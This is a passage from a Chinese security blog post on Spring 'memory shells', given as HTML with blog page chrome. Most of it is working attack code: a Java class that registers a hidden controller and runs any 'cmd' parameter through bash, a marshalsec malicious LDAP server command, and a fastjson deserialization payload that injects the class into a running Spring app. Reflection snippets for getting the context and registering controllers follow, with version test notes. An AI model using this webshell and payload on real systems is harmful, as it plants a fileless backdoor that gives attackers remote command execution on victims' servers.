+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">InjectToController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InjectToController</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 关于获取Context的方式有多种</span></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.</span><br><span class="line">                currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Method method = Class.forName(<span class="string">"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping"</span>).getDeclaredMethod(<span class="string">"getMappingRegistry"</span>);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 通过反射获得该类的test方法</span></span><br><span class="line">        Method method2 = InjectToController.class.getMethod("test");</span><br><span class="line">        <span class="comment">// 定义该controller的path</span></span><br><span class="line">        PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">"/str3am"</span>);</span><br><span class="line">        <span class="comment">// 定义允许访问的HTTP方法</span></span><br><span class="line">        RequestMethodsRequestCondition ms = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line">        <span class="comment">// 构造注册信息</span></span><br><span class="line">        <span class="comment">//RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span></span><br><span class="line">        Class&lt;?&gt; class1 = Class.forName(<span class="string">"org.springframework.web.servlet.mvc.method.RequestMappingInfo"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Get RequestMappingInfo Success!"</span>);</span><br><span class="line">        RequestMappingInfo info = (RequestMappingInfo)class1.getDeclaredConstructor(PatternsRequestCondition<span class="class">.<span class="keyword">class</span>, <span class="title">RequestMethodsRequestCondition</span>.<span class="title">class</span>, <span class="title">ParamsRequestCondition</span>.<span class="title">class</span>, <span class="title">HeadersRequestCondition</span>.<span class="title">class</span>, <span class="title">ConsumesRequestCondition</span>.<span class="title">class</span>, <span class="title">ProducesRequestCondition</span>.<span class="title">class</span>, <span class="title">RequestCondition</span>.<span class="title">class</span>).<span class="title">newInstance</span>(<span class="title">url</span>,<span class="title">ms</span>,<span class="title">null</span>,<span class="title">null</span>,<span class="title">null</span>,<span class="title">null</span>,<span class="title">null</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建用于处理请求的对象，避免无限循环使用另一个构造方法</span></span><br><span class="line">        InjectToController injectToController = <span class="keyword">new</span> InjectToController(<span class="string">"aaa"</span>);</span><br><span class="line">        <span class="comment">// 将该controller注册到Spring容器</span></span><br><span class="line">        mappingHandlerMapping.registerMapping(info, injectToController, method2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InjectToController</span><span class="params">(String aaa)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 获取请求</span></span><br><span class="line">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="comment">// 获取请求的参数cmd并执行</span></span><br><span class="line">        <span class="comment">// 类似于PHP的system($_GET["cmd"])</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(request.getParameter("cmd"));</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,request.getParameter(<span class="string">"cmd"</span>)).start();</span><br><span class="line">        <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line">        writer.write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">        writer.flush();</span><br><span class="line">        writer.close();</span><br><span class="line">        process.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启动恶意LDAP服务，在8090开启web服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8090/#InjectToController</span></span><br></pre></td></tr></table></figure>
+
+<p>直接向vuln路由打fastjson payload，注入controller内存马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content=&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"ldap://127.0.0.1:1389/#InjectToController"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注入成功</p>
+<p><img src="/2022/05/26/Java-09/WA-OaE9WFvRrDNFbRiCEOQF3GegzluUFpGRMNuoqG3I.png" alt="image"></p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>controller处理是在interceptor之后，注入恶意controller也可以达到效果</p>
+<p>这里controller具体的调度过程不再分析，注入的流程大体为从context获取到mappingHandlerMapping对象，创建恶意的RequestMappingInfo实例，然后调用mappingHandlerMapping的mappingHandlerMapping注册即可</p>
+<p>尝试在springboot 2.6.0之后复现，成功注入内存马，但是访问的时候报错</p>
+<p><code>java.lang.IllegalArgumentException: Expected lookupPath in request attribute &quot;org.springframework.web.util.UrlPathHelper.PATH&quot;.</code> </p>
+<p>查了一下发现在springboot 2.6.0之后不能有自定义注册RequestMapping的逻辑，应该也是为了防御内存马，除了添加配置目前没有找到比较好的解决方法</p>
+<p><a href="https://liuyanzhao.com/1503010911382802434.html" target="_blank" rel="noopener">https://liuyanzhao.com/1503010911382802434.html</a></p>
+<p><a href="https://blog.csdn.net/maple_son/article/details/122572869" target="_blank" rel="noopener">https://blog.csdn.net/maple_son/article/details/122572869</a></p>
+<h2 id="获取Context方法"><a href="#获取Context方法" class="headerlink" title="获取Context方法"></a>获取Context方法</h2><p>来自landgrey师傅分享</p>
+<ol>
+<li>getCurrentWebApplicationContext</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure>
+
+<p>springboot 2.5.13测试获取失败</p>
+<ol start="2">
+<li>WebApplicationContextUtils</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure>
+
+<p>springboot 2.5.13测试获取失败，<code>org.springframework.web.servlet.support.RequestContextUtils</code> 没有getWebApplicationContext方法</p>
+<p><img src="/2022/05/26/Java-09/YtoyZNq30d8gRVwD0DpKL3oHS_ZGhMHyxtBu3TWXWLg.png" alt="image"></p>
+<ol start="3">
+<li>RequestContextUtils</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure>
+
+<p>springboot 2.5.13测试获取失败，<code>org.springframework.web.servlet.support.RequestContextUtils</code> 没有getWebApplicationContext方法</p>
+<ol start="4">
+<li>getAttribute</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>springboot 2.5.13测试成功</p>
+<p><img src="/2022/05/26/Java-09/8ewg8SkImNvfIpp5FNCtBkhk1hYVNAKSdPjrJ23A3u8.png" alt="image"></p>
+<ol start="5">
+<li>LiveBeansView</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span></span><br><span class="line">java.lang.reflect.Field filed = Class.forName(<span class="string">"org.springframework.context.support.LiveBeansView"</span>).getDeclaredField(<span class="string">"applicationContexts"</span>);</span><br><span class="line"><span class="comment">// 2. 属性被 private 修饰，所以 setAccessible true</span></span><br><span class="line">filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 3. 获取一个 ApplicationContext 实例</span></span><br><span class="line">org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="keyword">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure>
+
+<p>springboot 2.5.13测试成功</p>
+<p>因为applicationContexts，使用了 <code>private static final</code> 修饰符，所以可以直接反射获取属性值，反射的get函数传入任何对象都是可以的，包括null</p>
+<p>值得注意的是，因为 <code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> <strong>3.2.x</strong> 版本（现在最新版本是 <strong>5.3.x</strong>）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例</p>
+<h2 id="注册Controller方法"><a href="#注册Controller方法" class="headerlink" title="注册Controller方法"></a>注册Controller方法</h2><p>我在springboot 2.5.14和2.6.0测试只有第一种方法能够成功注册，2.6.0能成功注册但是访问的时候报错，其他在测试的时候因为context缺少getBeanFactory方法失败</p>
+<ol>
+<li>registerMapping</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span></span><br><span class="line">Method method = (Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 3. 定义访问 controller 的 URL 地址</span></span><br><span class="line">PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">"/hahaha"</span>);</span><br><span class="line"><span class="comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">RequestMethodsRequestCondition ms = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line"><span class="comment">// 5. 在内存中动态注册 controller</span></span><br><span class="line">RequestMappingInfo info = <span class="keyword">new</span> RequestMappingInfo(url, ms, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">r.registerMapping(info, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance(), method);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>registerHandler</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">"dynamicController"</span>, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance());</span><br><span class="line"><span class="comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span></span><br><span class="line">org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 3. 反射获得 registerHandler Method</span></span><br><span class="line">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);</span><br><span class="line">m1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(dh, <span class="string">"/favicon"</span>, <span class="string">"dynamicController"</span>);</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>detectHandlerMethods</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">context.getBeanFactory().registerSingleton(<span class="string">"dynamicController"</span>, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance());</span><br><span class="line">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);</span><br><span class="line">m1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">m1.invoke(requestMappingHandlerMapping, <span class="string">"dynamicController"</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Refferences"><a href="#Refferences" class="headerlink" title="Refferences"></a>Refferences</h2><ul>
+<li><a href="https://mp.weixin.qq.com/s/12ovmcKHzozFGlxK9ZBzqw" target="_blank" rel="noopener">深入浅出内存马(二) 之SpringBoot内存马</a></li>
+<li><a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">基于内存 Webshell 的无文件攻击技术研究</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2022/05/26/Java-09/" title="Spring Memory Shell">https://jlkl.github.io/2022/05/26/Java-09/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/26/Java-08/" rel="prev" title="Tomcat Memory Shell">
+      <i class="fa fa-chevron-left"></i> Tomcat Memory Shell
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/26/Java-10/" rel="next" title="Agent Memory Shell">
+      Agent Memory Shell <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Interceptor-Memory-Shell"><span class="nav-number">1.</span> <span class="nav-text">Interceptor Memory Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实例"><span class="nav-number">1.1.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Controller-Memory-Shell"><span class="nav-number">2.</span> <span class="nav-text">Controller Memory Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实例-1"><span class="nav-number">2.1.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-1"><span class="nav-number">2.2.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取Context方法"><span class="nav-number">3.</span> <span class="nav-text">获取Context方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注册Controller方法"><span class="nav-number">4.</span> <span class="nav-text">注册Controller方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Refferences"><span class="nav-number">5.</span> <span class="nav-text">Refferences</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.siriyang.cn/" title="https:&#x2F;&#x2F;blog.siriyang.cn&#x2F;" rel="noopener" target="_blank">Siriyang</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">401k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
